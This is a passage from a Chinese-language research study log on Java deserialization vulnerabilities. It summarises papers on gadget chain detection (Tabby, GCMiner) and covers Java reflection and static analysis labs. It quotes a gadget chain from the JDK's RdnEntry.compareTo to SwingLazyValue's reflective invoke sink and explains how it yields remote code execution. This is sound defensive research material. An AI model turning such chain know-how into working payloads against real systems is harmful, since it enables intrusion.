type="1"><li><p><strong>Class类：</strong>在Java中，每个类都有一个对应的<code>Class</code>对象，用于表示类的信息。你可以使用<code>Class</code>类的静态方法<code>forName</code>来获取一个类的<code>Class</code>对象。</p></li><li><p><strong>获取类信息：</strong>通过<code>Class</code>对象，你可以获取类的名称、父类、接口、构造方法、方法、字段等信息。这使得你可以在运行时了解类的结构。</p></li><li><p><strong>创建对象：</strong>反射允许你在运行时创建对象，即使你不知道类的名称，也可以使用<code>Class</code>对象的<code>newInstance</code>方法来实现。</p></li><li><p><strong>调用方法：</strong>使用反射，你可以在运行时调用类的方法。<code>Method</code>类表示一个方法，你可以使用它来调用方法，传递参数，并获取方法的返回值。</p></li><li><p><strong>访问字段：</strong>通过反射，你可以获取和修改对象的字段值。<code>Field</code>类表示一个字段，你可以使用它来读取和写入字段的值。</p></li><li><p><strong>访问构造方法：</strong>使用反射，你可以获取类的构造方法并创建对象的实例。<code>Constructor</code>类表示一个构造方法，你可以使用它来实例化对象。</p></li><li><p><strong>动态代理：</strong>反射还用于实现动态代理，允许你在运行时创建代理对象来控制对目标对象的访问。</p></li><li><p><strong>注解处理：</strong>反射也常用于处理注解，你可以通过反射获取类、方法或字段上的注解，并根据注解的信息执行相应的逻辑。</p></li></ol><p>反射通常在某些高级应用程序、框架和工具中使用，例如ORM（对象关系映射）、依赖注入、动态代码生成等。</p></li><li><p><code>代理对象（Proxy Object）</code>是在软件设计中常用的一种模式，用于<code>控制</code>对其他对象的访问。代理对象充当了其他对象的接口，以控制对这些对象的访问，通常用于添加额外的功能或控制访问权限。代理对象可以在不改变原始对象的情况下对其进行增强或包装。</p><p>代理对象通常有以下几种类型：</p><ol type="1"><li><p><strong>静态代理：</strong>在编译时创建的代理对象，开发人员需要手动编写代理类。静态代理通常用于实现特定功能，如日志记录或权限控制。</p></li><li><p><strong>动态代理：</strong>在运行时创建的代理对象，无需手动编写代理类，可以根据需要动态生成。Java中的动态代理通常使用<code>java.lang.reflect.Proxy</code>类和<code>InvocationHandler</code>接口实现。</p></li><li><p><strong>远程代理：</strong>用于在不同地址空间中控制对远程对象的访问。远程代理允许本地程序像访问本地对象一样访问远程对象。</p></li></ol><p>代理对象的一些常见应用场景包括：</p><ul><li><p><strong>AOP（面向切面编程）：</strong>代理对象可以用于实现横切关注点，例如日志记录、性能监控、事务管理等，而不需要在每个方法中编写相同的代码。</p></li><li><p><strong>延迟加载：</strong>代理对象可以用于延迟加载对象，只有在需要时才真正创建和初始化对象，以提高性能。</p></li><li><p><strong>权限控制：</strong>代理对象可以用于控制对某些操作的访问权限，根据用户的角色或权限级别来限制操作。</p></li><li><p><strong>远程调用：</strong>代理对象可用于在分布式系统中执行远程方法调用，以便在不同的计算机上执行操作。</p></li></ul><p>代理对象的设计模式有助于提高代码的可维护性和可扩展性，因为它们将关注点分离并允许在不影响原始对象的情况下添加或修改功能。代理对象通常是面向对象编程中的重要概念，经常与其他设计模式如装饰器模式、适配器模式等一起使用。</p></li><li><p><strong>问题</strong>：这个漏洞是因为在反序列化过程中，动态代理类<code>AnnotationInvocationHandler</code>中的<code>equalsImpl</code>()方法使用了反射，但成员"memberMethods"被标记为"<code>transient</code>"，反序列化无法控制它。这导致了一些静态分析工具认为这种反射是不受控制的，可能会导致潜在的安全问题。</p></li><li><p><code>JRE7u21</code> deserialization vulnerability.</p></li><li><p>那些不会推断本地变量和参数类型的常规静态分析工具会错误地将这样具有不正确参数的反射视为可控制的反射，从而产生许多错误结果</p></li></ol><h4 id="总结-6">总结</h4><ol type="1"><li><p><code>JAVA反射</code>拓宽了我的思路，能够发现更多的安全问题和提供了更多改进优化的思路</p></li><li><p>本文注意到了<strong>三个问题</strong>并提出了三个<code>提高检测精度</code>的方法</p><ol type="1"><li><p><code>CROSS-FUNCTION MEMBERS DATA FLOW TRACKING</code></p><p><strong>P</strong>:在JRE7u21反序列化漏洞中，成员"memberMethods"具有"transient"修饰符，这在反序列化中是不可控制的，因此常规的静态分析认为这个反射不可控制。</p><p><strong>S</strong>:在分析每个方法的数据流之前，需要初始化污点源（taintsources）和一个成员数据流表格。这个表格用于保存在执行过程中对象成员的变化以及谁改变了这些成员的信息</p></li><li><p><code>LOCAL VARIABLES AND ARGUMENTS TYPES INFERENCE</code></p><p>P:动态反射需要特定类型的参数数组来执行危险操作，而常规静态分析工具如果无法正确推断本地变量和参数的类型，可能会误判反射为可控制的</p><p>S:在操作栈和表中的每个元素中保存<code>类型信息</code>,包括确切类型和可能类型</p></li><li><p><code>CALL CHAIN SUBJECT INFERENCE BASED ON INHERITANCE RELATIONSHIPS</code></p><p><strong>P</strong>:如果存在一个调用链，其中在子类A、超类和子类B之间存在"this"或"super"方法调用，而且类A和类B之间没有继承关系，那么这个调用链可以被认为是不可能存在的调用链。</p><p><strong>S</strong>:在方法调用中确定继承关系，剔除无效的调用链</p></li></ol></li><li><p>另一方面在研究一些静态分析工具的<code>源码</code></p></li></ol><h3 id="section-13">2023-09-30</h3><h4 id="论文信息">论文信息</h4><ol type="1"><li><a href="https://ieeexplore.ieee.org/document/10202660">Tabby:Automated Gadget Chain Detection for Java DeserializationVulnerabilities</a>（<strong>CCF-B</strong>会议：DSN2023）<imgsrc="https://s2.loli.net/2023/09/30/7pMQi4mDtWCb5P8.png"alt="image-20230930164833918" /></li></ol><h4 id="正文-5">正文</h4><h5 id="background">background</h5><ol type="1"><li><p>Existing state-of-the-art analysis tools (e.g.,<code>Spotbugs</code> [8], <code>CodeQL</code> [9])</p></li><li><p><strong>难点</strong>：</p><ol type="1"><li><strong>控制流难以追踪</strong>：针对Java反序列化漏洞，其中一个根本原因是难以追踪控制流。与其他漏洞（如SQL注入或XSS）不同，无法仅仅依靠输入分析来检测漏洞。必须关注数据在输入后传递到源方法后的控制流，以确定是否会执行到危险的汇聚方法。这种控制流的复杂性增加了漏洞的发现和分析难度。</li><li><strong>多样性和复杂性</strong>：另一个根本原因是Java反序列化漏洞的多样性和复杂性。利用这些漏洞需要构造复杂的“小工具链”（gadgetchain），这些链由许多类对象的巧妙组合组成。由于Java的多态性和继承机制，存在大量潜在的小工具链。这增加了查找和利用这些漏洞的复杂性。同时，现有的分析工具通常无法有效地处理这些库中的漏洞，因为这些库通常非常广泛且数量众多。</li><li>此外，研究人员通常在手动追踪小工具链或<code>自定义</code>现有工具方面面临困难，因为后者要么不提供对自定义分析的支持，要么要求对每个新的自定义都进行源代码的重复分析。此外，自定义分析通常需要精细的调整，当需要为每个自定义重新分析源代码时，这将变得<code>耗时且容易出错</code>。因此，一个重大的技术挑战在于创建中间<code>数据结构</code>，可以存储所有潜在数据并促进多次自定义重新分析。我们对这一挑战的解决方案是使用代码属性图构建一个中间数据结构。</li></ol></li><li><p><code>RPC(Remote Procedure Call)</code>即远程过程调用,是一种进程间通信方式,允许客户机程序调用服务端程序的函数或者过程,具有以下主要特征:</p><ol type="1"><li>客户机可以像调用本地函数一样调用服务器端的函数或过程,不需要了解底层通信细节。</li><li>RPC隐藏了底层的网络通信,数据序列化,使得分布式计算透明化。</li><li>服务器端通过Skelton(存根函数)接收函数调用,执行函数后将结果返回客户端。</li><li>常用的RPC框架有gRPC, Thrift, Dubbo等。</li><li>RPC需要解决网络通信,序列化,目标查找,权限等多个方面的问题。</li><li>RPC的主要优势是对分布式通信进行封装抽象,调用远程函数像调用本地函数一样简单。</li><li>但RPC也存在额外开销,不宜用于对性能要求极高的场景。</li></ol></li><li><p>数据结构中存在的<strong>问题</strong></p><ol type="1"><li>The semantic information extracted during the analysis cannot bereused.</li></ol><p><strong>解决</strong>：图数据库。The introduction of graph databasessplits the static program analysis process into two parts: semanticinformation extraction and specific vulnerability patternidentification</p></li></ol><hr /><h5 id="tabbydesign-and-implementation">TABBYDESIGN ANDIMPLEMENTATION</h5><ol type="1"><li>our work’s <strong>technical challenge</strong> is to createintermediate data structures that store all potential data. To overcomethis, we propose a novel data structure based on<code>Code Property Graph (CPG)</code>, which involves converting Javacode into graph nodes and edges and storing the results in Neo4j.</li><li>we developed a <code>controllability analysis algorithm</code>(detailed in §III-C) to help construct the CPG.</li></ol><h4 id="总结-7">总结</h4><ol type="1"><li><p>一图总结Tabby工作流程<imgsrc="https://s2.loli.net/2023/10/01/WroAZShb8iF9R5X.png"alt="image-20231001151759302" /></p></li><li><p>设计思路</p><ol type="1"><li><p>首先构建<code>对象关系图（ORG）</code>、<code>方法调用图MCG、方法别名图（MAG）</code>,在此基础构建<code>代码属性图（CPG）</code></p></li><li><p>在<code>方法调用图（MCG）</code>中，使用<code>可控性分析算法</code>,生成更精确的<code>Precise Call Graph (PCG)</code></p><p>这个思路跟我之前想的一样：就是对数据结构进行合理化的调整，使得这个图提供更多我们需要的信息，移除不必要的信息</p></li><li><p>非常创新的一点在于它的三个算法,提高了寻找漏洞的<code>精确性</code>：可控性算法，Expander算法，Evaluator算法</p><ol type="1"><li><code>污染位置（Polluted Position）</code>：是CALL关系边的一个数组属性，用于表示方法调用者和方法参数的<code>可控性权重</code>。这个属性用于衡量方法调用的<code>污染程度</code>，即哪些部分可能受到不可信输入或变量污染的影响。在反序列化漏洞分析中，PP属性对于评估方法调用的风险和潜在漏洞非常重要。它帮助确定哪些参数或方法调用者需要受到额外的关注，以识别潜在的漏洞。</li><li><code>触发条件（Trigger Condition）</code>：是<code>汇聚方法</code>的一个数组属性，<strong>表示必须可控的参数以达到攻击效果</strong>。触发条件属性定义了在攻击效果触发时，必须满足的参数条件。这些条件通常用于确定攻击是否能够成功执行，以及哪些参数的可控性对于攻击效果至关重要。触发条件属性在分析和查找漏洞时起到关键作用，帮助确定哪些参数需要特别关注和保护，以防止潜在的攻击。</li><li>为了充分以上两个属性，设计了两个算法：<ol type="1"><li><code>Expander</code>用于确定关系边的PP是否满足TC的要求，</li><li>而<code>Evaluator</code>用于确定搜索深度是否超过了设置的限制或是否达到了目标节点</li></ol></li></ol></li><li><p>在soot（一个非常知名的开源静态分析工具）的基础上，使用三个算法结合实现了java反序列化的<code>利用链</code>查询</p></li></ol></li></ol><h3 id="section-14">2023-09-23</h3><h4 id="记录">记录</h4><ol type="1"><li><ahref="https://jf710001011.github.io/2023/08/26/lab-static-analysis/#toc-heading-16">指针分析lab</a><imgsrc="https://s2.loli.net/2023/09/23/w9lRgQVFnWj4iBS.png"alt="image-20230923215625766" /><ol type="1"><li>上下文敏感</li><li>非上下文敏感</li></ol></li></ol><h3 id="section-15">2023-09-16</h3><h4 id="笔记记录">笔记记录</h4><ol type="1"><li><ahref="https://jf710001011.github.io/2023/08/26/lab-static-analysis/#toc-heading-10">lab-4.类层次结构分析和过程间常量传播</a> <imgsrc="https://s2.loli.net/2023/09/16/FpxkTd1DaoUW8vS.png"alt="image-20230916204351902" /></li><li><ahref="https://jf710001011.github.io/2023/08/26/java/#toc-heading-28">Java泛型和foreach陷阱</a><imgsrc="https://s2.loli.net/2023/09/16/Bgz5Al1CnUH6XWe.png"alt="image-20230916204511941" /></li></ol><h4 id="总结-8">总结</h4><ol type="1"><li>lab实现了三个算法<imgsrc="https://s2.loli.net/2023/09/16/UN7dHkaKs3tLgwp.png"alt="image-20230916204617878" /></li><li>Java语法巩固</li></ol><h3 id="section-16">2023-09-09</h3><ol type="1"><li><ahref="https://jf710001011.github.io/2023/08/26/java/#toc-heading-26">Java集合框架</a><imgsrc="https://s2.loli.net/2023/09/09/KejiH6983dm1g7c.png"alt="image-20230909175945385" /></li><li><ahref="https://jf710001011.github.io/2023/08/26/lab-static-analysis/#toc-heading-8">lab-死代码检测</a><imgsrc="https://s2.loli.net/2023/09/09/wrn9tUIgCNHJxSP.png" /></li></ol><h3 id="section-17">2023-09-02</h3><ol type="1"><li>Java<ahref="https://jf710001011.github.io/2023/08/26/java/#toc-heading-5">关键字学习</a></li><li><ahref="https://jf710001011.github.io/2023/08/26/lab-static-analysis/#toc-heading-5">lab-常量传播和Worklist 求解器</a></li></ol><h3 id="section-18">2023-08-26</h3><ol type="1"><li><ahref="https://jf710001011.github.io/2023/08/26/lab-static-analysis/">实验过程简单记录</a></li></ol><h4 id="总结-9">总结</h4><ol type="1"><li>进行这些实验，一方面是回顾以往的分析方法，将这些分析技术串联起来；另一方面，静态分析的难点之一也是算法的实现，最终的研究结果都需要用代码实现</li><li>两周内结束这些实验后，尝试应用于分析反序列化漏洞</li></ol><h3 id="section-19">2023-08-19</h3><h4 id="论文1-3">论文1</h4><ol type="1"><li><ahref="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains-wp.pdf">AutomatedDiscovery of Deserialization Gadget Chains</a>（来自<strong>黑帽大会</strong>2018：Ian Haken Senior Security SoftwareEngineer, Netflix）</li></ol><hr /><h4 id="正文-6">正文</h4><ol type="1"><li>即使在从“<code>readObject()</code>”方法返回之前，反序列化库也会自动调用<code>魔术方法</code>。</li><li><code>ysoserial</code> 工具不能发现新的利用链</li><li><code>Gadget Inspector</code> tool</li></ol><h4 id="符号执行">符号执行</h4><ol type="1"><li><p>符号执行技术指的是通过程序分析的方法，确定哪些输入向量会对应导致程序的执行结果为某个向量的方法</p></li><li><p><strong>分析程序的执行路径</strong></p></li><li><p>例如</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> m<span class="token operator">=</span>M<span class="token punctuation">,</span> n<span class="token operator">=</span>N<span class="token punctuation">,</span> q<span class="token operator">=</span>Q<span class="token punctuation">;</span> <span class="token keyword">int</span> x1<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>x2<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>x3<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>m<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    x1<span class="token operator">=</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">&lt;</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>m <span class="token operator">&amp;&amp;</span> q<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        x2<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    x3<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">assert</span><span class="token punctuation">(</span>x1<span class="token operator">+</span>x2<span class="token operator">+</span>x3<span class="token operator">!=</span><span class="token number">3</span><span class="token punctuation">)</span></code></pre><ol type="1"><li>它有以下执行路径<imgsrc="https://s2.loli.net/2023/08/19/w4bsB1xDZroVMKh.png"alt="简单理解符号执行1" /></li><li>叶子节点显示的数值表示当前输入情况下，可以得到的数值。（比如，如果英雄出装是M<sup>(N&lt;12)，那么最终的属性值R=0）。其中M</sup>(N&lt;12)表达的是，M是非零值且N要小于12，Q为任意值的情况下，得到R=0。可以发现，当条件为~M<sup>(N&lt;5)</sup>Q时，得到了最终结果等于3.即，我们通过这种方式逆向发现了输入向量。<strong>如果把结果条件更改为漏洞条件，理论上也是能够进行漏洞挖掘了。</strong></li><li>符号执行的流程<imgsrc="https://s2.loli.net/2023/08/19/vO7x2QLpFA3yih1.png"alt="image-20230819212728240" /></li></ol></li></ol><h4 id="总结-10">总结</h4><ol type="1"><li>通过黑帽大会那篇论文了解了现存工具是如何就检测gadgetchain的，但目前大部分工具都是只能检测已经发现的工具利用链</li><li>符号执行也是一种非常适合静态分析的技术</li><li>下周开始 进行这8个静态分析实验<imgsrc="https://s2.loli.net/2023/08/19/GRIq68XMKLveDgw.png"alt="image-20230819212534334" /></li></ol><h3 id="section-20">2023-08-12</h3><h4 id="论文1-4">论文1</h4><ol type="1"><li><a href="https://ieeexplore.ieee.org/document/10172888">ImprovingJava Deserialization Gadget Chain Mining via Overriding-Guided ObjectGeneration</a>（程序语言<strong>CCF-A</strong>:2023 IEEE/ACM 45thInternational Conference on Software Engineering (ICSE)）</li></ol><hr /><ol start="2" type="1"><li><p>关注<code>Gadget Inspector</code>工具：static taintanalysis</p></li><li><p>关注<code>SerHybrid</code> ：hybrid analysis solution</p></li><li><p>SerHybrid has limited effectiveness due to <strong>tworeasons</strong>：</p><ol type="1"><li>SerHybrid performs points-to analysis [16] to identifysource-to-sink method execution paths. However, due to the dynamicfeatures (e.g., runtime polymorphism [17]) of Java language, anyavailable overridden method (gadget) on the application’s classpath maybe exploited to construct gadget chains, resulting in <strong>high falsenegatives</strong></li><li>due to the unawareness of hard constraints (requiring dynamicallymodifying the properties of an injection object to trigger the targetgadget chain) introduced by certain gadgets, such generated injectionobjects may be <strong>semantically invalid</strong></li></ol></li><li><p>Found:</p><ol type="1"><li>Java deserialization gadgets are usually exploited by abusingadvanced <strong>language features</strong> (e.g., runtimepolymorphism), which enables attackers to reuse serializable overriddenmethods on the application’s classpath;</li><li>attackers usually invoke exploitable overridden methods (gadgets)via <code>dynamic binding</code> [19] to generate injection objects forgadget chain construction.</li></ol></li><li><p>GCMiner performs static analysis to construct the<code>Deserialization-Aware Call Graph</code> (DA-CG) to model bothexplicit and implicit (method overriding) method calls to identify moregadget chains.</p></li><li><p>GCMiner adopts an<code>overriding-guided object generation approach</code> to generateexploitable injection objects for fuzzing.</p></li><li><p>two state-of-the-art gadget chain mining tools,：</p><ol type="1"><li>Gadget Inspector</li><li>Serhybrid</li></ol></li><li><p><code>magic method</code>：执行payload触发反序列化；lastgadget执行<code>恶意命令</code></p></li><li><p>Property-Oriented Programming (POP)</p></li><li><p>示例分析:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token number">1</span>  <span class="token comment">/*javax.naming.ldap.Rdn$RdnEntry.class*/</span><span class="token number">2</span>  <span class="token keyword">private</span> <span class="token class-name">Oject</span> value<span class="token punctuation">;</span><span class="token number">3</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compareTo</span><span class="token punctuation">(</span><span class="token class-name">RdnEntry</span> that<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">/*Source or Magic Method*/</span><span class="token number">4</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>value<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>that<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span>  <span class="token number">5</span>  <span class="token comment">/*com.sun.org.apache.xpath.internal.objects.XString.class*/</span><span class="token number">6</span>  <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">/*2nd gadget*/</span><span class="token number">7</span>    <span class="token keyword">return</span> <span class="token function">str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>obj2<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token number">8</span>  <span class="token comment">/*javax.swing.MultiUIDefaults.class*/</span><span class="token number">9</span>  <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">/*3rd gadget*/</span><span class="token number">10</span>   <span class="token class-name">Enumeration</span> keys <span class="token operator">=</span> <span class="token function">keys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">11</span>   <span class="token keyword">while</span> <span class="token punctuation">(</span>keys<span class="token punctuation">.</span><span class="token function">hasMoreElements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">12</span>     <span class="token class-name">Object</span> key <span class="token operator">=</span> keys<span class="token punctuation">.</span><span class="token function">nextElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">13</span>     buf<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>key <span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">+</span> <span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token number">14</span> <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">Object</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">/*4th gadget*/</span><span class="token number">15</span>    <span class="token class-name">Object</span> value <span class="token operator">=</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span> <span class="token number">16</span> <span class="token comment">/*javax.swing.UIDefaults.class*/</span><span class="token number">17</span> <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">Object</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">/*5th gadget*/</span><span class="token number">18</span>   <span class="token class-name">Object</span> value <span class="token operator">=</span> <span class="token function">getFromHashtable</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token number">19</span> <span class="token keyword">private</span> <span class="token class-name">Object</span> <span class="token function">getFromHashtable</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">Object</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">/*6th gadget*/</span><span class="token number">20</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token keyword">instanceof</span> <span class="token class-name">LazyValue</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">21</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token number">22</span>      value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">LazyValue</span><span class="token punctuation">)</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">createValue</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token number">23</span> <span class="token comment">/*sun.swing.SwingLazyValue.class*/</span><span class="token number">24</span> <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">createValue</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">UIDefaults</span> table<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">/*7th gadget*/</span><span class="token number">25</span>   <span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token number">26</span>     <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> c <span class="token operator">=</span> <span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">27</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>methodName <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">28</span>       <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> types <span class="token operator">=</span> <span class="token function">getClassArray</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">29</span>       <span class="token class-name">Method</span> m <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>methodName<span class="token punctuation">,</span> types<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">30</span>       <span class="token function">makeAccessible</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">31</span>       <span class="token keyword">return</span> m<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/*Sink or Security-Sensitive Call Site*/</span></code></pre><p>这段代码展示了一个Java反序列化漏洞的利用链:</p><ol type="1"><li><p>RdnEntry的compareTo方法作为<strong>入口</strong>点被触发。</p></li><li><p>调用了XString的equals方法。</p></li><li><p>进而调用了MultiUIDefaults的toString方法。</p></li><li><p>toString遍历键值对并调用get方法。</p></li><li><p>get调用了父类UIDefaults的get。</p></li><li><p>最终调用了getFromHashtable。</p></li><li><p>在LazyValue的情况下会<strong>反射调用指定的方法</strong>。</p></li><li><p>攻击者可以构造恶意LazyValue,并注入任意方法。</p></li><li><p>这样就可以通过反序列化调用任意方法,实现RCE。</p></li></ol><p>分析:</p><ul><li>反序列化时compareTo被调用</li><li>多个类组成了完整的调用链</li><li>LazyValue反射调用点可被利用</li><li>攻击者可构造执行任意代码的payload</li></ul><p>这展示了Java反序列化漏洞的复杂利用链分析过程。</p></li><li><p>well-known vulnerability disclosure platforms such as NationalVulnerability Database (<code>NVD</code>), Common Vulnerabilities andExposures (<code>CVE</code>) , Exploit Database(<code>Exploit-D</code>)</p></li><li><p>An exploitable gadget chain requires:</p><ol type="1"><li>a <code>magic method</code> (source or the first gadget)deserializing untrusted data that can be injected by attackers;</li><li>a <code>security-sensitive call site</code> (sink or the lastgadget) that ultimately executes a dangerous operation; and</li><li>a series of gadgets facilitating the<code>propagation of injection objects</code> [33].</li></ol></li><li><p><code>Java runtime polymorphism</code></p></li><li><p>invoke <code>overridden methods</code></p></li><li><p><code>application’s classpath</code></p></li><li><p><code>Java reflection</code></p></li><li><p>modify the <code>properties of injection objects</code></p></li><li><p>known gadget<code>chainCommonsCollections1 of ysoserial</code>：combine dynamicproxy and dynamic binding</p></li><li><p>add <code>additional overriding relations</code> through ClassHierarchy Analysis <code>(CHA)</code> [37] to construct aDeserialization-Aware Call Graph (DACG) to identify implicit methodcalls</p></li><li><p><strong>Framework of GCMiner</strong><imgsrc="https://s2.loli.net/2023/08/12/qk8GMreLyua5T21.png"alt="image-20230812045329846" /></p></li><li><p><strong>Overview of gadget chain verification.</strong><imgsrc="https://s2.loli.net/2023/08/12/dMgqlI1UOXzw89F.png"alt="image-20230812045122878" /></p></li><li><p><strong>Partial DA-CG</strong> for our motivating example.<imgsrc="https://s2.loli.net/2023/08/12/f14cFJqGPUODCh5.png"alt="image-20230812045150441" /></p></li><li><p>a <code>declarative language</code> for graph data retrieval[39], to design <code>query scripts</code> for suspicious gadget chainidentification.</p></li><li><p>A simple query <code>script</code> example.</p><pre class="language-cypher" data-language="cypher"><code class="language-cypher"><span class="token number">1</span>  <span class="token keyword">match</span> <span class="token punctuation">(</span>source<span class="token operator">:</span> <span class="token class-name">Method</span> <span class="token punctuation">&#123;</span>NAME<span class="token operator">:</span><span class="token string">"readObject"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token number">2</span>  <span class="token keyword">match</span> <span class="token punctuation">(</span>sink<span class="token operator">:</span> <span class="token class-name">Method</span> <span class="token punctuation">&#123;</span>NAME<span class="token operator">:</span><span class="token string">"invoke"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token number">3</span>  <span class="token keyword">call</span> apoc<span class="token punctuation">.</span>algo<span class="token punctuation">.</span><span class="token function">allSimplePaths</span><span class="token punctuation">(</span>sink<span class="token punctuation">,</span> source<span class="token punctuation">,</span> <span class="token string">"&lt;Call|Overriding>"</span><span class="token punctuation">)</span>   <span class="token keyword">yield</span> path<span class="token number">4</span>  <span class="token keyword">return</span> path</code></pre></li><li><p>然后，为了使生成的注入对象能够遵循目标gadget链的执行流程，GCMiner通过<code>动态绑定</code>的方式<strong>修改</strong>注入对象的属性值</p></li><li><p>对于属性选择，我们通过<code>Java反射</code>动态获取注入对象的每个属性类型[40]-[42]，这允许软件系统在<code>运行时</code>检查和更改其类、接口、方法和字段的行为</p></li><li><p>当属性类型是<code>类对象</code>时，该属性将被列为值赋值的候选属性。</p></li><li><p>GCMiner 利用 <code>JQF-Zest 算法</code> [44]来生成新的输入，通过在位级别改变有趣的种子来更深入地进入目标 gadget链。</p></li><li><p>实验的<strong>实现</strong>：</p><ol type="1"><li>tabby: Java代码分析工具</li><li>Neo4j: 图数据库</li><li>JQF算法：注入对象生成策略</li></ol></li><li><p>实验<strong>评估指标</strong>：</p><ol type="1"><li>Known Gadget Chains (KGC）</li><li>Reported Gadget Chains (Rep)</li><li>True Positives (TP)<imgsrc="https://s2.loli.net/2023/08/12/sfhPjOHJr9u6NIG.png"alt="image-20230812055654282" /></li><li>Precision (P)<imgsrc="https://s2.loli.net/2023/08/12/VnpwuC1Fo4yORvB.png"alt="image-20230812055702103" /></li></ol></li><li><p>从这篇论文中挑选的有用的参考文献：</p><ol 